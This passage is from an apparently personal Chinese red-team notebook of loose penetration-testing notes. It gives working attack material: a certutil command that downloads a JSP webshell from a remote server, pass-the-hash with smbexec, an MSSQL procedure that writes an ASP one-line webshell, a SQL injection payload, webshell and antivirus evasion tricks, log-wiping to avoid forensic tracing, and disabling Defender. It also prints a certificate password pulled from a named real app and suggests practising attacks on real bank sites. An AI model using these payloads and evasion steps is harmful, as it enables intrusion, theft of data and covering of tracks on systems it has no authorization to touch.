class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;cmd.exe /c  certutil -urlcache -split -f http://vps/ccc.txt  webapps/nc_web/ccc.jsp&quot;</span>);<br></code></pre></td></tr></table></figure><p> 开启ntlm远程登陆，登陆远程桌面。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">REG ADD <span class="hljs-string">&quot;HKLM\System\CurrentControlSet\Control\Lsa&quot;</span> /v DisableRestrictedAdmin /t REG_DWORD /d <span class="hljs-number">00000000</span> /f        <br></code></pre></td></tr></table></figure><p>得到域控ip之后，不能直接通过ntlm登陆，先用smb管道开启ntlm登陆方式。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cmd">python3 smbexec.py -hashes :ntlm 域/域管用户@域控ip<br>并执行<br>REG ADD &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; /v DisableRestrictedAdmin /t REG_DWORD /d <span class="hljs-number">00000000</span> /f <br></code></pre></td></tr></table></figure><p>应急响应中 查看回收站也是很重要的一环</p><p>应急响应中 在c盘的用户&#x2F;公用也是很重要的一环</p><p>在数据库的用户文件如果加盐了  就用同一个盐新建一个自己的user 就能用这个user登录</p><p>原来shell是可以学习编辑器的，多用正则表达式，精通正则&#x3D;精通shell</p><p>杀毒软件主要是基于 .txt 文件进行查杀的，而我们只需要对 .txt 文件进行些许的改动即可实现免杀。</p><p>复现后可以看工具原理和工具代码—再看源码为现代吗</p><p>在攻击结束后，如何不留痕迹的清除日志和操作记录，以掩盖入侵踪迹，这其实是一个细致的技术活。在蓝队的溯源中，攻击者的攻击路径都将记录在日志中，所遗留的工具也会被蓝队进行分析，在工具中可以查找特征，红队自研工具更容易留下蛛丝马迹。你所做的每一个操作，都要被抹掉；你所上传的工具，都应该被安全地删掉，以防被溯源在演练中失分。</p><p>微软为了更进一步的防御系统的DLL被劫持，将一些容易被劫持的系统DLL写进了一个注册表项中，那么凡是此项下的DLL文件就会被禁止从EXE自身所在的目录下调用，而只能从系统目录即SYSTEM32目录下调用。</p><p>安全客投稿可以领取现金，当然技术下限也高</p><p>extension 这个环境变量，设置执行脚本是要引入的动态链接库文件（Linux 下是.so，Windows 下是.dll）：</p><p>！会做的不如会写的，会写的不如会说的。这对面试时候谈价钱很有用</p><p>要能够将写好的报告重要内容和原理有条理的口头叙述出来</p><p>ysosiral  就是一种调用他们自带的那些shiro啊 weblogic啥的payload去生成反序列化并自带有run模块上载到指定的网站进行命令执行。所以那个payload里面的部分命令执行代码也可改（但是不同中间件对应的模板只能轻改。（过waf啥的））。然后也可以自己写payload和command反序列化框架来进行自定义自己的命令执行。</p><p>域内就域控默认开启smb签名</p><p>命令后面加上<code>0&gt;&amp;1</code>，代表将标准输入重定向到标准输出</p><p>spn不是票据</p><p>msfm后渗透载荷里面有新建服务功能</p><p>APT攻击说到底就是有个好的钓鱼手法，好的免杀shellcode。好的隐藏配置。钓很多人的鱼</p><p>mimikatz不能抓取win10。但是可以用自带的lsass.exe弄进靶机搞hash</p><p>dns隐藏ip流量和dns隐藏隧道不一样。dns隐藏隧道就是利用dns服务直接像开监听器一样开dns监听器去进行接受反弹dnsshell。具有很强的穿透性和高速，但大多情况下用不到它。然后有些时候它又成了唯一方法。所以说dns隐藏隧道只是我们开隧道的一种方式。而不是我想的那种配合dns去隐藏frp、ew隧道那些</p><p>dns隐藏ip就是我们开c2服务器的时候在外网映射一样。可以把我们的c2服务器多层外网映射出去。然后再在公网ip分配dns。进行流量重发。从而达到防守方难以察觉我们dns的真正ip。</p><p>内存溢出可以造成RCE也可以用于内网提权。但两种利用方式不一样</p><p>rootkit始终是最终研究方向之一。十年前如此，十年后依旧如此</p><p>做shell到底还是用devc++。因为c都是向下兼容的</p><p>可以使用截屏命令看看是否处于锁屏状态</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204161415419.webp" alt="图片"></p><p>如果处于锁屏状态。就无发对受害机利用远控软件（向日葵那些）</p><p>利用哥斯拉自带的shellcodeLoader上线到CS，这个模块在实战下还是很好用的</p><p>如果存在360，会被提示拦截，解决方法是注入到另一个system权限进程下去执行命令</p><p>PE文件的全称是Portable Executable，意为可移植的可执行的文件</p><p>xor就是异或，用于shellcode免杀</p><p>虚拟机逃逸和二进制和pwn有关系</p><p>webshell中如果没有回显，我们最好让它导出到当前地址，方便我们查看.</p><p>linux万物皆文件</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204161415422.png" alt="image-20220119184342360"></p><p>ntdsl.dat是活动目录数据库。属于不可信程序。用wmic去复制弄出来可以隐蔽点免得被干。</p><p>当然上面部分写法是错的</p><p>蚁剑找寻数据操作时不能选mysql 要选mysql1因为mysql不能改端口  只能使用默认端口 而实际端口往往不一样</p><p>UAC</p><ul><li>配置Windows Update</li><li>增加或删除用户账户</li><li>改变用户的账户类型</li><li>改变UAC设置</li><li>安装ActiveX</li><li>安装或移除程序</li><li>安装设备驱动程序</li><li>设置家长控制</li><li>将文件移动或复制到Program Files或Windows目录</li><li>查看其他用户文件夹</li></ul><p>ms15-051 对win2008不蓝屏</p><p>MS16-014对win2008会蓝屏</p><p>不是所有的pe文件都可以用来当cs载荷进行横向。有的就不行  连上后会断 。具有适配性</p><p><a href="https://blog.csdn.net/swartz_lubel/article/details/70255686">https://blog.csdn.net/swartz_lubel/article/details/70255686</a> </p><p>一般需要满足服务的pe文件才适合</p><p><strong>svchost.exe 也可能是恶意软件所伪装</strong>，尤其是当它们存在于除C:\Windows\System32和C:\Windows\SysWOW64（仅64位）以外目录。</p><p>Ntds.dit卷影拷贝可以弄出里面的hash</p><p>更换思路，依旧从管理员到system出发，利用winlogon获得system权限，通过StartService启动trustedinstaller服务，从而进步获取trustedinstaller的权限，利用trustedinstaller来停止defender</p><p>rustinstall权限比system权限更大 而system无法stopdefence防护 但是trust可以</p><p>既有注册表开机自启动 又有服务开机自启动</p><p>什么iis解析漏洞、apache解析漏洞、tomcat解析漏洞基本上都发生于文件上传</p><p>非预期就是再命令字符串间具有错误的正则写法照成攻击者利用非预期错误，构造字符从而绕过正则，就比如<a href="https://www.jianshu.com/p/076c5b422c96%E4%B8%AD%E9%9D%9E%E9%A2%84%E6%9C%9F%E7%9A%84%E5%8E%9F%E5%9B%A0%E6%98%AF%E9%94%99%E8%AF%AF%E7%9A%84%E6%AD%A3%E5%88%99%E5%86%99%E6%B3%95%E5%8C%B9%E9%85%8D%E4%BA%86%60|/%60%EF%BC%8C%E8%80%8C%E9%9D%9E%E9%A2%84%E6%9C%9F%E7%9A%84%60/%60%E3%80%82%E8%80%8C%E4%B8%94%E8%BF%99%E7%A7%8D%E9%9D%9E%E9%A2%84%E6%9C%9F%E5%9B%A0%E4%B8%BA%E6%98%AF%E5%88%A9%E7%94%A8%E6%AD%A3%E5%88%99%E9%99%90%E5%88%B6%E5%91%BD%E4%BB%A4%E3%80%82%E6%89%80%E4%BB%A5%E5%A4%A7%E9%83%A8%E5%88%86%E5%8F%91%E7%94%9F%E4%BA%8E%E7%B3%BB%E7%BB%9F%E4%B8%8A%E7%9A%84%E9%94%99%E8%AF%AF%E3%80%82%E6%89%80%E4%BB%A5%E5%86%8DPWN%EF%BC%8C%E9%80%86%E5%90%91,web%EF%BC%8C%E8%AF%AD%E8%A8%80%E4%B8%AD">https://www.jianshu.com/p/076c5b422c96中非预期的原因是错误的正则写法匹配了`|\`，而非预期的`\`。而且这种非预期因为是利用正则限制命令。所以大部分发生于系统上的错误。所以再PWN，逆向,web，语言中</a> 都有产生</p><p>400大多是没有将网址添加到hosts的原因</p><p>mitm6配合Krbrelax.py成功中继会得到证书。而且数据很多，需要辨别和提取成txt</p><p>原来.sh就是shell语言的标志</p><p>cs3.4才能上线winxp和2003 当然对cs4.4进行修改也可以</p><p>docker逃逸的一个方法：通过sda挂载、然后创建ssh私钥并写入主机ssh目录 然后连接</p><p>2022spring core</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204161415802.png" alt="image-20220401232007718"></p><p>①前端加密的情况下waf是无法识别到你的恶意payload的②大家都不想打，是一块未被开发过的宝地。PS:大家想练手的话，可以找各种银行的站点，一般银行站点都有前端加密的。</p><p>对web控件进行右键然后”检查“，就能找出对应的F12js源码</p><p>我们可以将字典入库，增加keywordcount字段用于计数，当我们的关键词命中时，对应的keywordcount值加1。每次使用字典时，从数据库中order by keyword_count desc提取关键词，这样会生成一个根据关键词命中次数降序的字典，这样经常命中的关键词就会靠前，我们使用的字典的效率也会提高，循环往复我们的字典将会越加成熟。</p><ol><li><p>通过修改请求参数值后追加 单双引号 逐个重放，遍历每个参数，确认那个参数会引起响应异常。</p></li><li><p>对异常的参数，通过修改请求参数值后追加payload 来检测命令注入、ssrf、代码注入、sql注入、信息泄露等漏洞。</p></li></ol><p>调试浏览器</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD/640" alt="图片"></p><p>以前的远控器+现在的免杀也有很好的效果</p><p>印象笔记可以剪藏网页  要经常用它</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204161415769.png" alt="image-20220412234745223"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204161415676.png" alt="image-20220412234755608"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204161415850.jpeg" alt="img"></p><p>php 可以这样用 和html套用</p><p>很多的<tr> &lt;&#x2F; tr&gt; 由此可以意识到该页面使用了wordpress</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">AND</span> <span class="hljs-built_in">mod</span>(<span class="hljs-number">29</span>,<span class="hljs-number">9</span>)<span class="hljs-operator">+</span>div<span class="hljs-operator">+</span><span class="hljs-variable">@a</span>:<span class="hljs-operator">=</span>(concat(database(),&quot;--&quot;,&quot;_Y000!_&quot;))<span class="hljs-operator">+</span><span class="hljs-keyword">UNION</span><span class="hljs-operator">+</span>DISTINCTROW<span class="hljs-operator">+</span><span class="hljs-keyword">SELECT</span><span class="hljs-operator">+</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-variable">@a</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span><br><br><br><br>&quot;AND&quot; <span class="hljs-operator">=</span> 如果用<span class="hljs-keyword">AND</span>分隔的所有条件都为<span class="hljs-literal">TRUE</span>，则<span class="hljs-keyword">AND</span>运算符将返回一条记录。<br>&quot;mod(29,9)&quot; <span class="hljs-operator">=</span> mod的功能是在值之间进行划分<br>&quot;div&quot; <span class="hljs-operator">=</span> 在<span class="hljs-keyword">sql</span>中，div函数被视为除法<br>&quot;@a:=&quot; <span class="hljs-operator">=</span> 用于在内部保存<span class="hljs-keyword">SQL</span>查询，例如<span class="hljs-variable">@a</span>:<span class="hljs-operator">=</span>(concat(database(),&quot;--&quot;,&quot;_Y000!_&quot;)<br>&quot;union&quot; <span class="hljs-operator">=</span> 连接两个以上的<span class="hljs-keyword">sql</span>命令<br>&quot;distinctrow&quot; <span class="hljs-operator">=</span> 避免结果重复<br>&quot;select&quot; <span class="hljs-operator">=</span> 从数据库中选择我们想要的<br>&quot;数据库中的列数<br>&quot;<span class="hljs-keyword">AND</span> <span class="hljs-built_in">mod</span>(<span class="hljs-number">29</span>,<span class="hljs-number">9</span>)<span class="hljs-operator">+</span>div<span class="hljs-operator">+</span><span class="hljs-variable">@a</span>:<span class="hljs-operator">=</span>(concat(database(),&quot;--&quot;,&quot;_Y000!_&quot;))<span class="hljs-operator">+</span><span class="hljs-keyword">UNION</span><span class="hljs-operator">+</span>DISTINCTROW<span class="hljs-operator">+</span><span class="hljs-keyword">SELECT</span><span class="hljs-operator">+</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-variable">@a</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>&quot;<br></code></pre></td></tr></table></figure><p>可以木马写进txt 在通过上传无毒的jsp.php.等去引用这个txt就能bypass（检测文件内容的waf）</p><p>在审计某个模块代码时，我们可以通过跟踪数据流或者跟踪控制流的方式去阅读，那么那种方法比较好呢？答案是既不关心数据流也不关心控制流，而是只关注本模块的实现。因为多年的经验告诉我们，精神力是影响代码审计效率的重要原因，而在不同模块中来回跳转往往形成了精神的消耗。比如在某些复杂的项目代码中，查找某个函数的实现会不断地打开新文件，从而不断地涌出需要解决的新问题，在不断追踪的过程中，往往会迷失在好奇的海洋中，从而忘记了原来的审计任务。</p><p>如果确实要打破砂锅问到底，那么也建议在审计记录上先做个标记，等完成当前模块的审计后再对其进行深入分析。</p><p>如果某件事情手工做了三次，那么就应该写个脚本去进行自动化</p><p>如果上传jsp码 大部分都被拦截 甚至连hello world都拦截 可以尝试对木马进行加密 在网上查找相关的资料，发现LandGrey大佬的一个unicode编码的木马。<a href="https://links.jianshu.com/go?to=https://github.com/LandGrey/webshell-detect-bypass/tree/master/webshell/jsp">https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FLandGrey%2Fwebshell-detect-bypass%2Ftree%2Fmaster%2Fwebshell%2Fjsp</a></p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%<span class="hljs-meta">@page</span> <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.*,java.net.*,java.sql.*,java.text.*&quot;</span>%&gt;<br>&lt;%!<br>\u0053\u0074\u0072\u0069\u006e\u0067\u0020\u0050\u0077\u0064\u003d\<br>.........<br>%&gt;<br></code></pre></td></tr></table></figure><p>遇到waf拦截菜刀流量的突破方法</p><p>下面是回显</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204161426063.jpeg" alt="图片"></p><p>下面是方法</p><p><a href="https://www.uedbox.com/post/58916/">https://www.uedbox.com/post/58916/</a></p><p><a href="https://github.com/Ch1ngg/CaidaoMitmProxy">https://github.com/Ch1ngg/CaidaoMitmProxy</a></p><p>不过这些都是借用。。还是得自己学好java去进行改进</p><p>如果是插入图片码的话、在这个过程中也踩了一些坑，有些图片源码包含特殊字符会和木马的源代码发生冲突，因此需要特殊处理过的图片才能保证正常解析。推荐使用如下图片。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204161431794.jpeg" alt="图片"></p><p>使用notepad++打开图片，把jsp马插入到图片源码中。</p><p><img src="E:/typora%E5%9B%BE%E7%89%87/640-16735232589041.jpeg" alt="图片"></p><p>更改为jsp后缀进行上传</p><p>如果失败 最好在码的前面和后面都插入</p><p>解析成功的回显如下:</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204161434828.jpeg" alt="图片"></p><p>docx是doc进行xml转置文件  将其后缀改为zip后可以看到很多xml文件</p><p>而且可以将xml载入目录&#x2F;etc&#x2F;passwd  或者插入xxe代码  就能实行xxedengdeng</p><p>然后还能再写入php木马到zip然后上传  然后再用php伪协议&#x2F;&#x2F;zip将其解压就能获得webshell</p><p>php魔方加密 1 2 3</p><p><a href="https://blog.csdn.net/weixin_35949264/article/details/115147668">https://blog.csdn.net/weixin_35949264/article/details/115147668</a></p><p>首先是为什么能成功解析成php文件？</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">if</span> (test_input(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;wname&quot;</span>])!==<span class="hljs-string">&quot;&quot;</span>)&#123;<span class="hljs-regexp">//</span>自定义文件名<br><br>        <span class="hljs-variable">$newname</span>=test_input(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;wname&quot;</span>]).<span class="hljs-string">&quot;.&quot;</span>.end(<span class="hljs-variable">$uptype</span>); <span class="hljs-regexp">//</span>新的文件名<br></code></pre></td></tr></table></figure><p>我觉得这个地方能够上传成功与文件名命名格式有关，众所周知，英文状态下冒号是不允许存在的，应该是这个地方产生了截断，导致后面的<code>.jpg</code>没有被拼接上。</p><p><strong>Shiro-721****，对应CVE-2019-12422，影响范围Apache Shiro &lt; 1.4.2</strong>。后期Shiro组件的加密key是系统随机产生的，无法猜到key。但是安全专家很快发现，Shiro的加密方式是AES-128-CBC，CBC加密方式存在一个 Padding Oracle Attack漏洞，可以得到一个存在反序列化数据的AES加密密文，发送给服务端后，shiro组件会解密然后触发反序列化代码执行漏洞。这种攻击方式的前提是需要登录后台获取一个合法Cookie。</p><p><strong>一次成功的Shiro Padding Oracle需要一直向服务器不断发包，判断服务器返回，攻击时间通常需要几个小时。</strong>由于此漏洞利用起来耗时时间特别长，很容易被waf封禁，因此在真实的红队项目中，极少有此漏洞的攻击成功案例，大家多数都是在虚拟机环境下测试。</p><p>遇到的各种坑的解决方法:<a href="https://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484091&idx=1&sn=4dcce59a842f17035d0018bf650671ae&chksm=c25fcdc0f52844d608b6b87d85082b74d5e15888e76001127ff40cc407a46e5e5de446b1365e&mpshare=1&scene=23&srcid=042312zNRzQM4ycBAZSa7pUd&sharer_sharetime=1650691567395&sharer_shareid=ee83a55e0b955b99e8343acbb61916b7#rd">https://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&amp;mid=2247484091&amp;idx=1&amp;sn=4dcce59a842f17035d0018bf650671ae&amp;chksm=c25fcdc0f52844d608b6b87d85082b74d5e15888e76001127ff40cc407a46e5e5de446b1365e&amp;mpshare=1&amp;scene=23&amp;srcid=042312zNRzQM4ycBAZSa7pUd&amp;sharer_sharetime=1650691567395&amp;sharer_shareid=ee83a55e0b955b99e8343acbb61916b7#rd</a></p><p>20220421 五号暗区 今日一论：哈希算法和加密算法有什么区别？为什么对口令的保护更多使用哈希算法而不是加密算法？</p><p>1 hash不可逆，且长度相等，普通加密可逆，且长度不等<br>2 口令属于的作用在于比较验证，不需要还原成明文，所以使用hash</p><p>既然是dbo的权限那么也可以尝试通过差异备份等等的方法来绕过杀毒，这里利用的是存储过程来写文件</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">declare</span> <span class="hljs-variable">@o</span> <span class="hljs-type">int</span>, <span class="hljs-variable">@f</span> <span class="hljs-type">int</span>, <span class="hljs-variable">@t</span> <span class="hljs-type">int</span>, <span class="hljs-variable">@ret</span> intexec sp_oacreate <span class="hljs-string">&#x27;scripting.filesystemobject&#x27;</span>, <span class="hljs-variable">@o</span> outexec sp_oamethod <span class="hljs-variable">@o</span>, <span class="hljs-string">&#x27;createtextfile&#x27;</span>, <span class="hljs-variable">@f</span> <span class="hljs-keyword">out</span>, <span class="hljs-string">&#x27;c:\inetpub\muma.asp&#x27;</span>, <span class="hljs-number">1</span><span class="hljs-keyword">exec</span> <span class="hljs-variable">@ret</span> <span class="hljs-operator">=</span> sp_oamethod <span class="hljs-variable">@f</span>, <span class="hljs-string">&#x27;writeline&#x27;</span>, <span class="hljs-keyword">NULL</span>,<span class="hljs-string">&#x27;&lt;%execute(request(&quot;a&quot;))%&gt;&#x27;</span> <br></code></pre></td></tr></table></figure><p>利用导入xvg文件进行xxs</p><p><a href="https://mp.weixin.qq.com/s?__biz=MzkwNzEzMTg3MQ==&mid=2247485101&idx=1&sn=f1cf5a130a662990e665a796024517ba&chksm=c0dca81df7ab210b442563f85d3f2d12f73c1d9c8e2027705fb7cae88f6a993e6606a308b467&mpshare=1&scene=23&srcid=0425cjVGunK3XgzUbgnMn5l9&sharer_sharetime=1650890307991&sharer_shareid=9108c08c45d1f36cab8f5c866e004fa3#rd">https://mp.weixin.qq.com/s?__biz=MzkwNzEzMTg3MQ==&amp;mid=2247485101&amp;idx=1&amp;sn=f1cf5a130a662990e665a796024517ba&amp;chksm=c0dca81df7ab210b442563f85d3f2d12f73c1d9c8e2027705fb7cae88f6a993e6606a308b467&amp;mpshare=1&amp;scene=23&amp;srcid=0425cjVGunK3XgzUbgnMn5l9&amp;sharer_sharetime=1650890307991&amp;sharer_shareid=9108c08c45d1f36cab8f5c866e004fa3#rd</a></p><p>20220425今日一问：Session和Cookie的区别？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs tiddlywiki">1）Cookie：用户登录后，服务端委托浏览器把用户信息存储在cookie中，客户端每次发起请求时要携带这个cookie，服务端收到请求时从cookie中取出用户信息，就知道是哪个用户了。<br>但是服务器无法检测 这个cookie是否被篡改，所以不安全。<br>2）Session：用户登录后将用户信息保存到服务器内存中，并返回一个ssesionid让浏览器设置到cookie中，浏览器之后每次发起请求都会携带cookie，服务端收到后取出cookie中的sessionid，再从内存中取出与之相对应的用户信息，这样就知道是哪个用户了。<br>但是当用户增多时，服务器内存压力会很大。<br>3）Token：用户登录后，服务端会签发一个token发给客户端，客户端收到后爸token放到cookie或LocalStorage（局部存储器），之后每次向服务端请求资源时都要携带token，服务端收到后验证tokne，就知道哪个用户了。token的好处是，可以很方便的拓展，一处发票，处处用票。但是缺点是，不能踢人，发出去了就只能等他票据过期了，还有需要保证密钥足够安全<br><br>服务端可以检测到token是否被篡改，比较安全<br><br>session,记录服务器和客户端会话状态的机制，使服务端可以记录会话信息<br><br>token，访问资源时需要的资源凭证，不会存储会话信息<br><br>cookie，保存在浏览器的个人信息，辨别用户身份，进行session跟踪<br><br>session：服务器给客户端起的别名，用于分辨谁是谁。<br>cookie：只存在于浏览器的特殊容器，用于携带一部分浏览器需要传递给服务器的信息。<br>token：服务器用于证明“我的确给过客户端授权，至于客户端是谁？我不在乎”<br><br><br>token和session最核心的区别是发证和验证的解耦合<br><br></code></pre></td></tr></table></figure><p>20220406 每日一问 tcp和http的差别</p><p>tcp有状态：每一次的交换数据都和上一次相关，ack确认上次接收的报文<br>http无状态：每次请求都是独立请求，上下没有任何关系，服务器也不记录是不是同一用户</p><p>查看目录的时候，发现了网站的报错信息，好熟悉啊，是thinkphp的框架<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204271707630.png" alt="图片"></p><p>这么说的话，让我再看一看发送的包和返回的包，有了惊喜发现，该网站用的是基于thinkphp框架的thinkcmf框架<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204271707348.png" alt="图片"></p><p>这里教一些前端看代码的小技巧，第一个是js代码格式化，点击下面这个花括号，就能格式化JS代码比较好看<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204292101238.png" alt="图片"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204292101970.png"></p><p>第二点就是如何找接口，通过ctrl+F搜索path: ‘，就能看到他的路由配置或者直接搜routes或者home（有没有大佬还有好的方法可以评论区说说）<img src="E:/typora%E5%9B%BE%E7%89%87/640-16735232589052.png" alt="图片"></p><p>如果发现一个接口是<a href="https://x.x.com/#/XXXXconferenceRoomList%EF%BC%8C%E6%8B%BC%E6%8E%A5%E7%9B%B4%E6%8E%A5get%E8%AF%B7%E6%B1%82%E8%AE%BF%E9%97%AE%EF%BC%8C%E5%89%8D%E7%AB%AF%E4%BC%9A%E8%87%AA%E5%8A%A8%E5%90%91%E5%90%8E%E7%AB%AF%E5%8F%91%E8%B5%B7%E5%AF%B9%E5%BA%94%E6%8E%A5%E5%8F%A3%E7%9A%84%E6%9F%A5%E8%AF%A2%EF%BC%8C%E6%9B%BF%E6%8D%A2%E9%83%A8%E5%88%86%E5%8F%82%E6%95%B0%E5%8D%B3%E5%8F%AF%E6%9F%A5%E8%AF%A2%E5%88%B0%E6%83%B3%E8%A6%81%E6%9F%A5%E8%AF%A2%E5%88%B0%E4%BF%A1%E6%81%AF%EF%BC%8C%E6%9C%AA%E5%81%9A%E6%9D%83%E9%99%90%E6%A0%A1%E9%AA%8C%EF%BC%8C%E6%9C%AA%E6%8E%88%E6%9D%83%E7%9B%B4%E6%8E%A5%E8%B0%83%E7%94%A8%E6%8E%A5%E5%8F%A3%E6%9F%A5%E5%88%B0%E4%B8%80%E4%BA%9B%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E4%BA%86">https://X.X.com/#/XXXXconferenceRoomList，拼接直接get请求访问，前端会自动向后端发起对应接口的查询，替换部分参数即可查询到想要查询到信息，未做权限校验，未授权直接调用接口查到一些敏感信息了</a></p><p>如果发现一个接口是XXXXAddressBookByProjectId，也是直接泄漏了地址、姓名、电话等敏感信息</p><p>如果看到一个很有趣的接口XXXXUserInfo，这明显是一个用户信息的接口，访问后显示系统修复中<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204292105913.png" alt="图片"></p><p>见到这个不要慌，URL后面直接?id&#x3D;1试试-&gt;不行，把数据包改成POST果然可以了，直接可以遍历用户了，接口还返回了用户名和密码，这不就齐活了</p><p>总结写在后面，前面也说了找接口用通过ctrl+F搜索path: ‘，就能看到他的路由配置或者直接搜routes或者home，还有就是有的js下面会配置POST包或者GET包参数，&#x3D;&#x3D;如果POST就是data，GET就是params&#x3D;&#x3D;，不像这次这么简单直接访问就把参数补齐了，我只能说细心再细心很重要~，再见各位。</p><p>在许多业务非常聚焦比如行业应用、银行、公共交通、游戏等行业，C&#x2F;S架构中服务器高度集中，对应用的版本控制非常严格，这时候就会在服务器上部署对app内置证书的校验代码。</p><p>抓包出现如下提示时，我们确定出此APP为服务器校验app客户端证书<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204292110187.jpeg" alt="图片"></p><p>对于此类APP抓包而言通常需要完成两项内容：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">找到证书文件<br>找到证书密码<br></code></pre></td></tr></table></figure><p>服务器对客户端进行校验过程中，客户端将证书公钥发送给服务器，以及从服务器获取session和私钥解密过程中，需要API进行操作，API存在于java层框架内，所以hook框架层代码<code>java.security.KeyStore</code>，使密码自吐</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"># frida -<span class="hljs-keyword">U</span> -f cn.soulapp.android -<span class="hljs-keyword">l</span> ssl.js  --<span class="hljs-keyword">no</span>-<span class="hljs-keyword">pause</span><br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204292112762.jpeg" alt="图片"></p><p>密码}%2R+\OSsjpP!w%X<br>然后首先使用常规方式解压搜索app包里的证书文件。一般apk进行解包，直接过滤搜索后缀名为p12的文件即可，一般常用的命令为tree -NCfhl |grep -i p12，直接打印出p12文件的路径.<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204292115305.jpeg" alt="图片"></p><p>更多详见<a href="https://mp.weixin.qq.com/s?__biz=Mzg2NTA4OTI5NA==&mid=2247497476&idx=1&sn=d12804a25ba122c1a4e06b28356ba745&chksm=ce5dd565f92a5c73fa027ec96d79469ff4883038da9c7ed4153ccfa289a22ee289da7243b34d&mpshare=1&scene=23&srcid=0427762FTBKHPUG2paGDrEAf&sharer_sharetime=1651060892855&sharer_shareid=ee83a55e0b955b99e8343acbb61916b7#rd">https://mp.weixin.qq.com/s?__biz=Mzg2NTA4OTI5NA==&amp;mid=2247497476&amp;idx=1&amp;sn=d12804a25ba122c1a4e06b28356ba745&amp;chksm=ce5dd565f92a5c73fa027ec96d79469ff4883038da9c7ed4153ccfa289a22ee289da7243b34d&amp;mpshare=1&amp;scene=23&amp;srcid=0427762FTBKHPUG2paGDrEAf&amp;sharer_sharetime=1651060892855&amp;sharer_shareid=ee83a55e0b955b99e8343acbb61916b7#rd</a></p><p>&lt;Frida自吐证书密码&gt;</p><p>死锁和堵塞的差别</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs makefile">1 死锁的概念解释<br>指多个进程在运行过程中因争夺资源而造成的一种僵局，当进程处于这种僵持状态时，若无外力作用，它们都将无法再向前推进。<br>2 死锁的产生<br><span 